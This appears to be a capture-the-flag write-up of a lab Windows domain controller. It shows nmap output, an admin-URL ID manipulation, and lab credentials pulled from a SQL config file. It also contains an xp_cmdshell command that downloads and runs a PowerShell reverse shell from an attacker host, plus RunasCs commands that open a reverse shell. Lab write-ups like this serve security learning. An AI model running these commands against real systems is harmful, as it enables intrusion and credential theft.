
# ipaddr  `10.10.11.5`

# Date 08-06-24 || Rohit Tiwari

> Nmap scan

```<>
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          nginx 1.25.5
|_http-server-header: nginx/1.25.5
|_http-title: Did not follow redirect to http://freelancer.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-08 11:39:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-08T11:39:34
|_  start_date: N/A
|_clock-skew: 4h59m59s

Service detection performed. Please report any incorrect resu
```

# PORT 80

>On port 80 found a simple website hosted on `nginx 1.25.5`

![](Attachments/Pasted%20image%2020240608121403.png)

> Tried several method but no use

### Okay this authentication part looks interesting

![](Attachments/Pasted%20image%2020240608130511.png)




Okay after that created a account as freelancer with username "Dedrknex" & Pass="Password@123" got access but nothig useful

![](Attachments/Pasted%20image%2020240608131516.png)

Tried uploading rev shell to profile pic but didn't  work


> Now again registerd to employer portal with `user=Devilrk & pass=NPassword@123`
> And tried login but cannot as it need verification...So reset the passwd an luckily got into the employer section

![](Attachments/Pasted%20image%2020240608132644.png)

>Okay so found a qr code scanner page don't know what to do with it

![](Attachments/Pasted%20image%2020240608133351.png)

okay so searched using google lens found 
![](Attachments/Pasted%20image%2020240608133933.png)

# http://freelancer.htb/accounts/login/otp/MTAwMjM=/baf68992a6b344d9f4ed0f8f6971b253/


> Okay found admin name 

![](Attachments/Pasted%20image%2020240608135339.png)

> Okay so the above link `http://freelancer.htb/accounts/login/otp/MTAwMjM=/baf68992a6b344d9f4ed0f8f6971b253/` i break it down upto is link where verification is need ed then MTAwMjM= is prfile no in that case is  10023 used cyberchef to decode it found 


![](Attachments/Pasted%20image%2020240608140951.png)


on figuring to out to profile by check blogs and enumerating comments found this

![](Attachments/Pasted%20image%2020240608141037.png)


>Now for admin the profile num is 2 or it would be if four digite then 0002


so figured out admin will be Mg=

![](Attachments/Pasted%20image%2020240608142816.png)

pasted the url again from qr-code changed admin id Mgo= got access toa dmin page

![](Attachments/Pasted%20image%2020240608143144.png)

#  /admin

>Then moved to /admin page
>![](Attachments/Pasted%20image%2020240608143710.png)
> 	

> Now time to some research on how to extract pass or a shell

got some command to use : `https://gist.github.com/ashish2199/8ad29d80f3195ce3166bee55b2624653`

![](Attachments/Pasted%20image%2020240608234821.png)
`Select * from INFORMATION_SCHEMA.KEY_COLUMN_USAGE;`

![](Attachments/Pasted%20image%2020240608234856.png)

#### So created a revshell and upload it to sql server got revershell
![](Attachments/Pasted%20image%2020240609003447.png)

command `EXEC xp_cmdshell 'powershell -c "IEX (iwr -usebasicparsing http://10.10.16.11:80/revshell.ps1)"'`

![](Attachments/Pasted%20image%2020240609003431.png)

## Found cred

```<>
Directory: C:\Users\sql_svc\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        5/27/2024   1:52 PM                SQLEXPR-2019_x64_ENU                                                  
SHELL> cd  SQLEXPR-2019_x64_ENU
SHELL> ls


    Directory: C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        5/27/2024   1:52 PM                1033_ENU_LP                                                           
d-----        5/27/2024   1:52 PM                redist                                                                
d-----        5/27/2024   1:52 PM                resources                                                             
d-----        5/27/2024   1:52 PM                x64                                                                   
-a----        9/24/2019   9:00 PM             45 AUTORUN.INF                                                           
-a----        9/24/2019   9:00 PM            784 MEDIAINFO.XML                                                         
-a----        9/29/2023   4:49 AM             16 PackageId.dat                                                         
-a----        9/24/2019   9:00 PM         142944 SETUP.EXE                                                             
-a----        9/24/2019   9:00 PM            486 SETUP.EXE.CONFIG                                                      
-a----        5/27/2024   4:58 PM            724 sql-Configuration.INI                                                 
-a----        9/24/2019   9:00 PM         249448 SQLSETUPBOOTSTRAPPER.DLL                                              


SHELL> type sql-Configuration.INI
```

got passwordss

```<>
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager"
SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SECURITYMODE="SQL"
SAPWD="t3mp0r@ryS@PWD"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True

```

now use crackmapexec to get verfication of the credential

![](Attachments/Pasted%20image%2020240609113839.png)

#### Runas utility

Run runasCs.exe to  run as user misckarman

```bash
SHELL> curl http://10.10.16.11:80/RunasCs.exe -o RunasCs.exe
SHELL> ls


    Directory: C:\Users\sql_svc\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        5/27/2024   1:52 PM                SQLEXPR-2019_x64_ENU                                                  
-a----         6/9/2024   7:42 AM          51712 RunasCs.exe                                                           


SHELL> .\RunasCs.exe mikasaAckerman IL0v3ErenY3ager cmd.exe -r 10.10.16.11:2929

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-4996a$\Default
[+] Async process 'C:\WINDOWS\system32\cmd.exe' with pid 5836 created in background.
SHELL>
```

![](Attachments/Pasted%20image%2020240609121454.png)


Got User.txt


> Found memory dump

```bash
C:\Users\mikasaAckerman\Desktop>type mail.txt	
type mail.txt
Hello Mikasa,
I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
Best regards,
```
# SMB PORT 445

>Tried smb but no luck then moved to crackmapexec so to enumerate shares or pass-pol got nothing

